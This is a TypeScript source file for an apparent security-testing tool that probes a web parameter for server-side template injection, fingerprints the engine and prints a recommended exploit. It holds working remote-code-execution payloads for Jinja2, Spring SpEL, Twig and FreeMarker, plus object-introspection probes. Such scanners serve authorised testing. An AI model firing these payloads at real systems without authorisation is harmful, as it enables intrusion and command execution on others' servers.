import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'ssti_detect',
  description: 'Server-Side Template Injection detector. Sends 10 math-expression probes covering Jinja2, Twig, FreeMarker, ERB, SpEL, Tornado, and Razor. Engine fingerprinted by which math result appears. Confirms RCE pathway via MRO chain probe without executing code.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url', type: 'string', required: true, description: 'Target URL' },
    { name: 'parameter', type: 'string', required: true, description: 'Parameter name to inject into' },
    { name: 'method', type: 'string', required: false, description: 'GET or POST', default: 'GET' },
    { name: 'baseline_value', type: 'string', required: false, description: 'Normal parameter value for baseline request', default: 'test' },
    { name: 'auth_header', type: 'string', required: false, description: 'Authorization header value' },
    { name: 'content_type', type: 'string', required: false, description: 'For POST: form or json', default: 'form' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Per-request timeout in ms', default: 8000 },
  ],
};

interface SstiProbe {
  payload: string;
  expected: string;
  engine_candidate: string;
}

const PROBES: SstiProbe[] = [
  { payload: '{{7*7}}',           expected: '49',      engine_candidate: 'Jinja2/Twig/Generic' },
  { payload: "{{7*'7'}}",         expected: '7777777', engine_candidate: 'Jinja2 (Python)' },
  { payload: "{{7*'7'}}",         expected: '49',      engine_candidate: 'Twig (PHP)' },
  { payload: '${7*7}',            expected: '49',      engine_candidate: 'FreeMarker/Java EL/EJS' },
  { payload: '#{7*7}',            expected: '49',      engine_candidate: 'Ruby ERB / Velocity' },
  { payload: '<%= 7*7 %>',        expected: '49',      engine_candidate: 'ERB / EJS' },
  { payload: '${{7*7}}',          expected: '49',      engine_candidate: 'Tornado (Python)' },
  { payload: '*{7*7}',            expected: '49',      engine_candidate: 'Spring SpEL (Java)' },
  { payload: '@(7*7)',             expected: '49',      engine_candidate: 'Razor (.NET)' },
  { payload: '{{7}}{{7}}',        expected: '77',      engine_candidate: 'Any template engine (sanity)' },
];

const CONFIRM_PROBES: Record<string, SstiProbe> = {
  'Jinja2 (Python)': {
    payload: "{{''.__class__.__mro__[1].__subclasses__()}}",
    expected: '<class',
    engine_candidate: 'Jinja2 RCE pathway',
  },
  'Spring SpEL (Java)': {
    payload: '${T(java.lang.Runtime)}',
    expected: 'Runtime',
    engine_candidate: 'SpEL RCE pathway',
  },
  'Twig (PHP)': {
    payload: '{{_self.env}}',
    expected: 'Environment',
    engine_candidate: 'Twig object access',
  },
};

interface ProbeResult {
  payload: string;
  expected: string;
  found: boolean;
  engine_candidate: string;
  false_positive_risk: boolean;
}

async function sendProbe(
  url: string,
  parameter: string,
  method: string,
  contentType: string,
  value: string,
  authHeader: string,
  timeoutMs: number,
): Promise<string> {
  const headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0' };
  if (authHeader) headers['Authorization'] = authHeader;

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    let resp: Response;
    if (method === 'GET') {
      const u = new URL(url);
      u.searchParams.set(parameter, value);
      resp = await fetch(u.toString(), { headers, signal: controller.signal });
    } else if (contentType === 'json') {
      headers['Content-Type'] = 'application/json';
      resp = await fetch(url, {
        method: 'POST', headers,
        body: JSON.stringify({ [parameter]: value }),
        signal: controller.signal,
      });
    } else {
      headers['Content-Type'] = 'application/x-www-form-urlencoded';
      const body = new URLSearchParams({ [parameter]: value });
      resp = await fetch(url, { method: 'POST', headers, body: body.toString(), signal: controller.signal });
    }
    clearTimeout(timer);
    return await resp.text();
  } catch {
    clearTimeout(timer);
    return '';
  }
}

export const sstiDetectTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const parameter = String(params.parameter || '');
    const method = String(params.method || 'GET').toUpperCase();
    const baselineValue = String(params.baseline_value || 'test');
    const authHeader = String(params.auth_header || '');
    const contentType = String(params.content_type || 'form').toLowerCase();
    const timeoutMs = Number(params.timeout_ms || 8000);

    if (!parameter) return { output: 'parameter is required', parsed: { error: 'missing parameter' } };

    const baselineBody = await sendProbe(url, parameter, method, contentType, baselineValue, authHeader, timeoutMs);

    const probeResults: ProbeResult[] = [];
    let detectedEngine: string | null = null;
    let rcePathAccessible = false;

    for (const probe of PROBES) {
      const body = await sendProbe(url, parameter, method, contentType, probe.payload, authHeader, timeoutMs);
      const found = body.includes(probe.expected) && !baselineBody.includes(probe.expected);
      const falsePosRisk = body.includes(probe.expected) && baselineBody.includes(probe.expected);

      probeResults.push({
        payload: probe.payload,
        expected: probe.expected,
        found,
        engine_candidate: probe.engine_candidate,
        false_positive_risk: falsePosRisk,
      });

      if (found && !detectedEngine) {
        detectedEngine = probe.engine_candidate;
      }
    }

    // Engine confirmation
    let confirmResult = '';
    let recommendedExploit = '';
    if (detectedEngine) {
      const confirmKey = Object.keys(CONFIRM_PROBES).find(k => detectedEngine!.includes(k.split(' ')[0]));
      if (confirmKey) {
        const confirmProbe = CONFIRM_PROBES[confirmKey];
        const confirmBody = await sendProbe(url, parameter, method, contentType, confirmProbe.payload, authHeader, timeoutMs);
        if (confirmBody.includes(confirmProbe.expected)) {
          rcePathAccessible = true;
          confirmResult = `RCE PATHWAY CONFIRMED: ${confirmProbe.engine_candidate} — object introspection accessible`;
        } else {
          confirmResult = `Engine detected (${detectedEngine}) but RCE pathway not directly accessible — sandboxing may be in place`;
        }
      }

      if (detectedEngine.includes('Jinja2')) {
        recommendedExploit = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}";
      } else if (detectedEngine.includes('SpEL')) {
        recommendedExploit = "${T(java.lang.Runtime).getRuntime().exec('id')}";
      } else if (detectedEngine.includes('Twig')) {
        recommendedExploit = "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}";
      } else if (detectedEngine.includes('FreeMarker')) {
        recommendedExploit = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}';
      } else {
        recommendedExploit = 'Use payload_crafter with vuln_type=ssti for engine-specific payloads';
      }
    }

    const confirmed = probeResults.some(r => r.found);
    const severity = rcePathAccessible ? 'critical' : confirmed ? 'high' : 'info';

    const divider = '─'.repeat(85);
    const header = `  ${'Payload'.padEnd(30)} | ${'Expected'.padEnd(10)} | ${'Found'.padEnd(5)} | Engine Candidate`;
    const rows = probeResults.map(r =>
      `  ${r.payload.padEnd(30)} | ${r.expected.padEnd(10)} | ${(r.found ? 'YES' : 'no').padEnd(5)} | ${r.engine_candidate}${r.false_positive_risk ? ' [FP RISK]' : ''}`
    ).join('\n');

    const output = [
      `SSTI Detection Results — ${url} (parameter: ${parameter})`,
      divider,
      header,
      divider,
      rows,
      divider,
      '',
      `Detected Engine: ${detectedEngine ?? 'None'}`,
      `Severity: ${severity.toUpperCase()}`,
      ...(confirmResult ? [`Confirmation: ${confirmResult}`] : []),
      ...(recommendedExploit && detectedEngine ? [`Recommended payload: ${recommendedExploit}`] : []),
    ].join('\n');

    return {
      output,
      parsed: {
        parameter,
        baseline_length: baselineBody.length,
        probes: probeResults as unknown as Record<string, unknown>[],
        detected_engine: detectedEngine,
        confirmed,
        severity,
        rce_path_accessible: rcePathAccessible,
        recommended_exploit: recommendedExploit,
      },
    };
  },
};
